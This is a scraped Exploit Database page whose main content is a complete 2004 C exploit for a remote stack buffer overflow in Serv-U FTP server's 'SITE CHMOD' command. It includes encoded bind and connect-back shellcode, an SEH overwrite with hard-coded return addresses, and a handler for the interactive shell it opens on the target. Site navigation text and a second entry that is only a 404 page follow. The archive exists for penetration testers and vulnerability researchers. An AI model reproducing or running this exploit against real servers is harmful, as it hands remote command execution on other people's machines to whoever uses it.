location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 149
RhinoSoft Serv-U FTPd Server 3.x/4.x - 'SITE CHMOD' Remote Overflow - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDRhinoSoft Serv-U FTPd Server 3.x/4.x - 'SITE CHMOD' Remote OverflowEDB-ID:149CVE:2004-2111EDB Verified:Author:lionType:remoteExploit:/Platform:WindowsDate:2004-01-27Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/**-----------------------------------------------------------------------** Servu.c - Serv-U FTPD 3.x/4.x "SITE CHMOD" Command* Remote stack buffer overflow exploit** Copyright (C) 2004 HUC All Rights Reserved.** Author   : lion*          : lion@cnhonker.net*          : http://www.cnhonker.com* Date     : 2004-01-25*          : 2004-01-25 v1.0 Can attack Serv-U v3.0.0.20~v4.1.0.11* Tested   : Windows 2000 Server EN/GB*          :	 + Serv-U v3.0.0.20~v4.1.0.11* Notice   : *** Bug find by kkqq kkqq@0x557.org ****          : *** You need a valid account and a writable directory. **** Complie  : cl Servu.c* Usage	   : Servu <-i ip> <-t type> [-u user] [-p pass] [-d dir] [-f ftpport] [-c cbhost] [-s shellport]*------------------------------------------------------------------------*/#include <winsock2.h>#include <windows.h>#include <stdio.h>#include <stdlib.h>#pragma comment(lib, "ws2_32")// for bind shellcode#define BIND_OFFSET		91// for connectback shellcode#define PORT_OFFSET		95#define IP_OFFSET		88#define SEH_OFFSET		0x193	//v3.0.0.20~v4.1.0.11//#define	SEH_OFFSET		0x133 // work on v3.0.0.16~v3.0.0.19, for connectback shellcode#define MAX_LEN			2048#define JMP_OVER		"\xeb\x06\xeb\x06"#define	VERSION			"1.0"struct{DWORD	dwJMP;char	*szDescription;}targets[] ={{0x7ffa4a1b,"Serv-U v3.0.0.20~v4.1.0.11  GB     2K/XP  ALL"},	//for all GB win2000 and winxp// {0x74FD69A9,"Serv-U v3.0.0.20~v4.1.0.11  GB     2K     SP3/SP4"},	//wsock32.dll jmp ebx addr// {0x71a469ad,"Serv-U v3.0.0.20~v4.1.0.11  GB     XP     SP0/SP1"},	//wsock32.dll jmp ebx addr// {0x77e45f17,"Serv-U v3.0.0.20~v4.1.0.11  GB/BG  2K     SP4"},	//user32.dll jmp ebx addr// {0x7ffa2186,"Serv-U v3.0.0.20~v4.1.0.11  BG     2K/XP  ALL"},	//for all BG win2000 and winxp// {0x6dec6713,"Serv-U v3.0.0.20~v4.1.0.11  BG     2K     SP4"},	//setupapi.dll jmp ebx addr// {0x6DEE6713,"Serv-U v3.0.0.20~v4.1.0.11  KR     2K     SP4"},	//setupapi.dll jmp ebx addr// {0x77886713,"Serv-U v3.0.0.20~v4.1.0.11  EN     2K     SP4"},	//setupapi.dll jmp ebx addr// {0x76b42a3a,"Serv-U v3.0.0.20~v4.1.0.11  EN     XP     SP1"},// {0x12345678,"Serv-U v3.0.0.20~v4.1.0.11"},},v;unsigned char	*szSend[4];unsigned char	szCommand[MAX_LEN];char		szDirectory[0x100];// 28 bytes decode by lion, don't change this.unsigned char decode[]="\xBE\x6D\x69\x6F\x6E\x4E\xBF\x6D\x69\x30\x6E\x4F\x43\x39\x3B\x75""\xFB\x4B\x80\x33\x93\x39\x73\xFC\x75\xF7\xFF\xD3";// Shellcode start sign, use for decode, don't change this.unsigned char sc_start[]="lion";// Shellcode end sign, use for decode, don't change this.unsigned char sc_end[]="li0n";// 311 bytes bind shellcode by lion (xor with 0x93)unsigned char sc[]="\x7A\x96\x92\x93\x93\xCC\xF7\x32\xA3\x93\x93\x93\x18\xD3\x9F\x18""\xE3\x8F\x3E\x18\xFB\x9B\x18\x64\xF9\x97\xCA\x7B\x36\x93\x93\x93""\x71\x6A\xFB\xA0\xA1\x93\x93\xFB\xE4\xE0\xA1\xCC\xC7\x6C\x85\x18""\x7B\xF9\x95\xCA\x7B\x1F\x93\x93\x93\x71\x6A\x12\x7F\x03\x92\x93""\x93\xC7\xFB\x92\x92\x93\x93\x6C\xC5\x83\xC3\xC3\xC3\xC3\xF9\x92""\xF9\x91\x6C\xC5\x87\x18\x4B\x54\x94\x91\x93\x93\xA6\xA0\x53\x1A""\xD4\x97\xF9\x83\xC4\xC0\x6C\xC5\x8B\xF9\x92\xC0\x6C\xC5\x8F\xC3""\xC3\xC0\x6C\xC5\xB3\x18\x4B\xA0\x53\xFB\xF0\xFE\xF7\x93\x1A\xF5""\xA3\x10\x7F\xC7\x18\x6F\xF9\x87\xCA\x1A\x97\x1C\x71\x68\x55\xD4""\x83\xD7\x6D\xD4\xAF\x6D\xD4\xAE\x1A\xCC\xDB\x1A\xCC\xDF\x1A\xCC""\xC3\x1E\xD7\xB7\x83\xC4\xC3\xC2\xC2\xC2\xF9\x92\xC2\xC2\x6C\xE5""\xA3\xC2\x6C\xC5\x97\x18\x5F\xF9\x6C\x6C\xA2\x6C\xC5\x9B\xC0\x6C""\xC5\xB7\x6C\xC5\x9F\xC2\xC5\x18\xE6\xAF\x18\xE7\xBD\xEB\x90\x66""\xC5\x18\xE5\xB3\x90\x66\xA0\x5A\xDA\xD2\x3E\x90\x56\xA0\x48\x9C""\x2D\x83\xA9\x45\xE7\x9B\x52\x58\x9E\x90\x49\xD3\x78\x62\xA8\x8C""\xE6\x74\xCD\x18\xCD\xB7\x90\x4E\xF5\x18\x9F\xD8\x18\xCD\x8F\x90""\x4E\x18\x97\x18\x90\x56\x38\xCD\xCA\x50\x7B\x65\x6D\x6C\x6C\x1D""\xDD\x9D\x7F\xE1\x6D\x20\x85\x3E\x4A\x96\x5D\xED\x4B\x71\xE0\x58""\x7E\x6F\xA8\x4A\x9A\x66\x3E\x37\x89\xE3\x54\x37\x3E\xBD\x7A\x76""\xDA\x15\xDA\x74\xEA\x55\xEA";// 294 bytes connectback shellcode by lion (xor with 0x93)unsigned char cbsc[]="\x7A\x6F\x93\x93\x93\xCC\xF7\x32\xA3\x93\x93\x93\x18\xD3\x9F\x18""\xE3\x8F\x3E\x18\xFB\x9B\x18\x64\xF9\x97\xCA\x7B\x0F\x93\x93\x93""\x71\x6A\xFB\xA0\xA1\x93\x93\xFB\xE4\xE0\xA1\xCC\xC7\x6C\x85\x18""\x7B\xF9\x97\xCA\x7B\x10\x93\x93\x93\x71\x6A\x12\x7F\x03\x92\x93""\x93\xC7\xFB\x92\x92\x93\x93\x6C\xC5\x83\xC3\xC3\xC3\xC3\xF9\x92""\xF9\x91\x6C\xC5\x87\x18\x4B\xFB\xEC\x93\x93\x92\xFB\x91\x93\x93""\xA6\x18\x5F\xF9\x83\xC2\xC0\x6C\xC5\x8B\x16\x53\xE6\xD8\xA0\x53""\xFB\xF0\xFE\xF7\x93\x1A\xF5\xA3\x10\x7F\xC7\x18\x6F\xF9\x83\xCA""\x1A\x97\x1C\x71\x68\x55\xD4\x83\xD7\x6D\xD4\xAF\x6D\xD4\xAE\x1A""\xCC\xDB\x1A\xCC\xDF\x1A\xCC\xC3\x1E\xD7\xB7\x83\xC4\xC3\xC2\xC2""\xC2\xF9\x92\xC2\xC2\x6C\xE5\xA3\xC2\x6C\xC5\x97\x18\x5F\xF9\x6C""\x6C\xA2\x6C\xC5\x9B\xC0\x6C\xC5\x8F\x6C\xC5\x9F\xC2\xC5\x18\xE6""\xAF\x18\xE7\xBD\xEB\x90\x66\xC5\x18\xE5\xB3\x90\x66\xA0\x5A\xDA""\xD2\x3E\x90\x56\xA0\x48\x9C\x2D\x83\xA9\x45\xE7\x9B\x52\x58\x9E""\x90\x49\xD3\x78\x62\xA8\x8C\xE6\x74\xCD\x18\xCD\xB7\x90\x4E\xF5""\x18\x9F\xD8\x18\xCD\x8F\x90\x4E\x18\x97\x18\x90\x56\x38\xCD\xCA""\x50\x7B\x6C\x6D\x6C\x6C\x1D\xDD\x9D\x7F\xE1\x6D\x20\x85\x3E\x4A""\x96\x5D\xED\x4B\x71\xE0\x58\x7E\x6F\xA8\x4A\x9A\x66\x3E\x7F\x6A""\x39\xF3\x74\xEA\x55\xEA";void usage(char *p){int	i;printf( "Usage:\t%s\t<-i ip> <-t type>\n""\t\t[-u user] [-p pass] [-d dir]\n""\t\t[-f ftpport] [-c cbhost] [-s shellport]\n\n""[type]:\n" , p);for(i=0;i<sizeof(targets)/sizeof(v);i++){printf("\t%d\t0x%x\t%s\n", i, targets[i].dwJMP, targets[i].szDescription);}}/* ripped from TESO code and modifed by ey4s for win32 */void shell (int sock){int     l;char    buf[512];struct	timeval time;unsigned long	ul[2];time.tv_sec = 1;time.tv_usec = 0;while (1){ul[0] = 1;ul[1] = sock;l = select (0, (fd_set *)&ul, NULL, NULL, &time);if(l == 1){l = recv (sock, buf, sizeof (buf), 0);if (l <= 0){printf ("[-] Connection closed.\n");return;}l = write (1, buf, l);if (l <= 0){printf ("[-] Connection closed.\n");return;}}else{l = read (0, buf, sizeof (buf));if (l <= 0){printf("[-] Connection closed.\n");return;}l = send(sock, buf, l, 0);if (l <= 0){printf("[-] Connection closed.\n");return;}}}}void main(int argc, char **argv){struct	sockaddr_in sa, server, client;WSADATA	wsd;SOCKET	s, s2, s3;int	iErr, ret, len;char	szRecvBuff[MAX_LEN];int	i, j, iType;int	iPort=21;char	*ip=NULL, *pUser="ftp", *pPass="ftp@ftp.com", *cbHost=NULL;char	user[128], pass[128];BOOL	bCb=FALSE, bLocal=TRUE;unsigned short	shport=53, shport2=0;unsigned long	cbip;unsigned int	timeout=5000, Reuse;char	penetrate[255],cbHost2[20];int seh_offset;printf( "Serv-U FTPD 3.x/4.x \"SITE CHMOD\" remote overflow exploit V%s\r\n""Bug find by kkqq kkqq@0x557.org, Code By lion (lion@cnhonker.net)\r\n""Welcome to HUC website http://www.cnhonker.com\r\n\n", VERSION);seh_offset = SEH_OFFSET;if(argc < 4){usage(argv[0]);return;}for(i=1;i<argc;i+=2){if(strlen(argv[i]) != 2){usage(argv[0]);return;}// check parameterif(i == argc-1){usage(argv[0]);return;}switch(argv[i][1]){case 'i':ip=argv[i+1];break;case 't':iType = atoi(argv[i+1]);break;case 'f':iPort=atoi(argv[i+1]);break;case 'p':pPass = argv[i+1];break;case 'u':pUser=argv[i+1];break;case 'c':cbHost=argv[i+1];bCb=TRUE;break;case 's':shport=atoi(argv[i+1]);break;case 'd':if(argv[i+1][0] != '/')strcpy(szDirectory, "/");strncat(szDirectory, argv[i+1], sizeof(szDirectory)-0x20);if(szDirectory[strlen(szDirectory)-1] != '/')strcat(szDirectory, "/");// correct the directory lenfor(j=0;j<(strlen(szDirectory)-1)%8;j++)strcat(szDirectory, "x");//printf("%d:%s\r\n", strlen(szDirectory), szDirectory);seh_offset = seh_offset - strlen(szDirectory)+1;break;}}if((!ip) || (!user) || (!pass)){usage(argv[0]);printf("[-] Invalid parameter.\n");return;}if( (iType<0) || (iType>=sizeof(targets)/sizeof(v)) ){usage(argv[0]);printf("[-] Invalid type.\n");return;}if(iPort <0 || iPort >65535 || shport <0 || shport > 65535){usage(argv[0]);printf("[-] Invalid port.\n");return;}_snprintf(user, sizeof(user)-1, "USER %s\r\n", pUser);user[sizeof(user)-1]='\0';_snprintf(pass, sizeof(pass)-1, "PASS %s\r\n", pPass);pass[sizeof(pass)-1]='\0';szSend[0] = user;	//userszSend[1] = pass;	//passszSend[2] = penetrate;	//pentrateszSend[3] = szCommand;	//shellcode// Penetrate through the firewall.if(bCb && shport > 1024){strncpy(cbHost2, cbHost, 20);for(i=0;i<strlen(cbHost); i++){if(cbHost[i] == '.')cbHost2[i] = ',';}sprintf(penetrate, "PORT %s,%d,%d\r\n", cbHost2, shport/256, shport%256);//printf("%s", penetrate);}else{sprintf(penetrate,"TYPE I\r\n");}// fill the "site chmod" commandstrcpy(szCommand, "site chmod 777 ");// fill the directoryif(szDirectory[0])strcat(szCommand, szDirectory);// fill the eggfor(i=0;i<seh_offset%8;i++)strcat(szCommand, "\x90");//strcat(szCommand, "BBBB");// fill the sehfor(i=0;i<=(seh_offset/8)*8+0x20;i+=8){strcat(szCommand, JMP_OVER);memcpy(&szCommand[strlen(szCommand)], &targets[iType].dwJMP, 4);}// fill the decodestrcat(szCommand, decode);// fill the shellcode start	signstrcat(szCommand, sc_start);// fill the shellcodeif(bCb){// connectback shellcodeshport2 = htons(shport)^(u_short)0x9393;cbip = inet_addr(cbHost)^0x93939393;memcpy(&cbsc[PORT_OFFSET], &shport2, 2);memcpy(&cbsc[IP_OFFSET], &cbip, 4);strcat(szCommand, cbsc);}else{// bind shellcodeshport2 = htons(shport)^(u_short)0x9393;memcpy(&sc[BIND_OFFSET], &shport2, 2);strcat(szCommand, sc);}// fill the shellcode end signstrcat(szCommand, sc_end);// send endstrcat(szCommand, "\r\n");if(strlen(szCommand) >= sizeof(szCommand)){printf("[-] stack buffer overflow.\n");return;}//	printf("send size %d:%s", strlen(szCommand), szCommand);__try{if (WSAStartup(MAKEWORD(1,1), &wsd) != 0){printf("[-] WSAStartup error:%d\n", WSAGetLastError());__leave;}s=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);if(s == INVALID_SOCKET){printf("[-] Create socket failed:%d",GetLastError());__leave;}sa.sin_family=AF_INET;sa.sin_port=htons((USHORT)iPort);sa.sin_addr.S_un.S_addr=inet_addr(ip);setsockopt(s,SOL_SOCKET,SO_RCVTIMEO,(char *)&timeout,sizeof(unsigned int));iErr = connect(s,(struct sockaddr *)&sa,sizeof(sa));if(iErr == SOCKET_ERROR){printf("[-] Connect to %s:%d error:%d\n", ip, iPort, GetLastError());__leave;}printf("[+] Connect to %s:%d success.\n", ip, iPort);if(bCb){Sleep(500);s2 = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);server.sin_family=AF_INET;server.sin_addr.S_un.S_addr=inet_addr(cbHost);//server.sin_addr.s_addr=INADDR_ANY;server.sin_port=htons((unsigned short)shport);setsockopt(s2,SOL_SOCKET,SO_RCVTIMEO,(char *)&timeout,sizeof(unsigned int));Reuse = 1;setsockopt(s2, SOL_SOCKET, SO_REUSEADDR, (char*)&Reuse, sizeof(Reuse));if(bind(s2,(LPSOCKADDR)&server,sizeof(server))==SOCKET_ERROR){printf("[-] Bind port on %s:%d error.\n", cbHost, shport);printf("[-] You must run nc get the shell.\n");bLocal = FALSE;//closesocket(s2);//__leave;}else{printf("[+] Bind port on %s:%d success.\n", cbHost, shport);listen(s2, 1);}}for(i=0;i<sizeof(szSend)/sizeof(szSend[0]);i++){memset(szRecvBuff, 0, sizeof(szRecvBuff));iErr = recv(s, szRecvBuff, sizeof(szRecvBuff), 0);if(iErr == SOCKET_ERROR){printf("[-] Recv buffer error:%d.\n", WSAGetLastError());__leave;}printf("[+] Recv: %s", szRecvBuff);if(szRecvBuff[0] == '5'){printf("[-] Server return a error Message.\r\n");__leave;}iErr = send(s, szSend[i], strlen(szSend[i]),0);if(iErr == SOCKET_ERROR){printf("[-] Send buffer error:%d.\n", WSAGetLastError());__leave;}if(i==sizeof(szSend)/sizeof(szSend[0])-1)printf("[+] Send shellcode %d bytes.\n", iErr);elseprintf("[+] Send: %s", szSend[i]);}printf("[+] If you don't have a shell it didn't work.\n");if(bCb){if(bLocal){printf("[+] Wait for shell...\n");len = sizeof(client);s3 = accept(s2, (struct sockaddr*)&client, &len);if(s3 != INVALID_SOCKET){printf("[+] Exploit success! Good luck! :)\n");printf("[+] ===--===--===--===--===--===--===--===--===--===--===--===--===--===\n");shell(s3);}}}else{printf("[+] Connect to shell...\n");Sleep(1000);s2 = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);server.sin_family = AF_INET;server.sin_port = htons(shport);server.sin_addr.s_addr=inet_addr(ip);ret = connect(s2, (struct sockaddr *)&server, sizeof(server));if(ret!=0){printf("[-] Exploit seem failed.\n");__leave;}printf("[+] Exploit success! Good luck! :)\n");printf("[+] ===--===--===--===--===--===--===--===--===--===--===--===--===--===\n");shell(s2);}}__finally{if(s != INVALID_SOCKET) closesocket(s);if(s2 != INVALID_SOCKET) closesocket(s2);if(s3 != INVALID_SOCKET) closesocket(s3);WSACleanup();}return;}// milw0rm.com [2004-01-27]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 150
404 Page Not Found | Exploit Database#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIED404Page Not FoundThe page you are looking for could not be found.HomeGHDBPapersShellcodesExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit 